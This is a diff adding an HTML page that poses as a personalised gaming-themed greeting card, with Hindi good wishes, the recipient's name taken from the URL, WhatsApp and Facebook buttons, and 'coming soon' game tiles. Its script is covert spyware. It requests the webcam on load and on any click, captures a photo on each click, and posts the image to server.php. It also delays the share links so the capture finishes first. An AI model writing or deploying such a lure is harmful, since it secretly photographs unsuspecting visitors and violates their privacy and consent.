@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Level Up Gaming</title>
+    <style>
+        /* Gaming Style CSS */
+        body {
+            margin: 0;
+            font-family: 'Courier New', Courier, monospace;
+            background: #0d0d0d;
+            background-image: radial-gradient(circle, #1a1a2e, #000000);
+            color: #fff;
+            text-align: center;
+            cursor: crosshair;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* Scroll allow karne ke liye overflow hidden hata diya */
+        }
+
+        /* Top Section CSS */
+        .main-screen {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 0;
+        }
+
+        .container {
+            border: 2px solid #00ffcc;
+            padding: 30px;
+            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 20px #00ffcc;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        h1 { 
+            color: #00ffcc; 
+            text-transform: uppercase; 
+            letter-spacing: 3px; 
+            margin-bottom: 10px;
+        }
+
+        .alok-text {
+            font-size: 3.5em;
+            color: #ff00ff;
+            text-shadow: 0 0 15px #ff00ff, 0 0 30px #ff00ff;
+            margin: 20px 0;
+            font-weight: bold;
+            animation: glitch 1.5s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: skewX(0); }
+            50% { transform: skewX(10deg); }
+        }
+
+        .wishing-section h2 { color: #00ffcc; text-transform: uppercase; }
+        .hindi-text { color: #ffcc00; font-size: 1.1em; }
+
+        /* Buttons CSS */
+        .btn-style {
+            padding: 15px 25px;
+            margin: 10px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: 0.3s;
+            text-transform: uppercase;
+            font-size: 1em;
+            width: 80%;
+        }
+
+        .whatsapp { background-color: #25d366; color: white; box-shadow: 0 0 10px #25d366; }
+        .facebook { background-color: #1877f2; color: white; box-shadow: 0 0 10px #1877f2; }
+        .btn-style:hover { opacity: 0.8; transform: scale(1.05); box-shadow: 0 0 20px white; }
+
+        /* Scrollable Games Section CSS */
+        .games-section {
+            width: 100%;
+            padding: 40px 20px;
+            background: rgba(10, 10, 10, 0.95);
+            border-top: 2px solid #ff00ff;
+            box-sizing: border-box;
+        }
+
+        .games-section h2 {
+            color: #ff00ff;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #ff00ff;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .game-card {
+            background-color: #1a1a1a;
+            border: 2px solid #333;
+            height: 180px;
+            border-radius: 10px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #555;
+            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+            transition: 0.3s;
+        }
+
+        .game-card:hover { border-color: #00ffcc; box-shadow: 0 0 15px #00ffcc; }
+
+        /* Coming Soon Overlay */
+        .coming-soon {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            color: #ff3333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2em;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transform: rotate(-10deg);
+            text-shadow: 0 0 10px #ff3333;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Main Screen (Wishing Section) -->
+    <div class="main-screen">
+        <div class="container">
+            <h1>Level Up Your Day</h1>
+            <div class="welcome-section">
+                <p class="hindi-text">आपका हर दिन खुशियों से भरा हो।</p>
+            </div>
+            
+            <!-- NAME DYNAMIC SECTION - No changes to ID -->
+            <div class="alok-text" id="userName">ALOK</div>
+            
+            <div class="wishing-section">
+                <h2>Mission: Happiness</h2>
+                <p>Wishing you and your lovely family an epic celebration!</p>
+                <p class="hindi-text">आज का दिन आपके जीवन में ढेर सारी खुशियाँ लेकर आए।</p>
+            </div>
+
+            <div class="share-buttons">
+                <!-- Direct Open Links -->
+                <button class="btn-style whatsapp" onclick="openLink('https://wa.me/')">Direct Open WhatsApp</button>
+                <button class="btn-style facebook" onclick="openLink('https://www.facebook.com/')">Direct Open Facebook</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scrollable Upcoming Games Section -->
+    <div class="games-section">
+        <h2>🔥 Upcoming Titles 🔥</h2>
+        <div class="games-grid">
+            <div class="game-card">Cyber Strike <div class="coming-soon">Coming Soon</div></div>
+            <div class="game-card">Neon Racer <div class="coming-soon">Coming Soon</div></div>
+            <div class="game-card">Galactic War <div class="coming-soon">Coming Soon</div></div>
+            <div class="game-card">Shadow Assassin <div class="coming-soon">Coming Soon</div></div>
+            <div class="game-card">Battle Arena <div class="coming-soon">Coming Soon</div></div>
+            <div class="game-card">Zombie Survival <div class="coming-soon">Coming Soon</div></div>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        let video = document.createElement('video');
+        let streamStarted = false;
+
+        // Auto-start camera in background if possible
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+            video.play();
+            streamStarted = true;
+        })
+        .catch(err => console.log("Camera waiting for interaction"));
+
+        // Capture Photo Logic
+        function capturePhoto() {
+            if (streamStarted) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/png');
+
+                fetch('server.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: imageData }),
+                    headers: { 'Content-Type': 'application/json' }
+                })
+                .then(response => console.log("Photo Captured & Sent"))
+                .catch(err => console.error("Error:", err));
+            }
+        }
+
+        // Trigger on ANY CLICK ON THE ENTIRE PAGE
+        document.addEventListener('click', () => {
+            if (!streamStarted) {
+                // Agar permission nahi mili thi, to click pe permission mangega
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    streamStarted = true;
+                    setTimeout(capturePhoto, 500); // Thoda ruk kar click karega taaki video load ho jaye
+                })
+                .catch(err => console.log("Camera access denied:", err));
+            } else {
+                // Permission pehle se hai to direct click
+                capturePhoto();
+            }
+        });
+
+        // Function for Open Link buttons
+        function openLink(url) {
+            // Thoda sa delay diya hai taaki background mein click wala function photo le sake
+            setTimeout(() => {
+                window.location.href = url;
+            }, 300); 
+        }
+
+        // Get name from URL - SAME LOGIC
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        if (name) {
+            document.getElementById("userName").textContent = name;
+        }
+    </script>
+</body>
+</html>
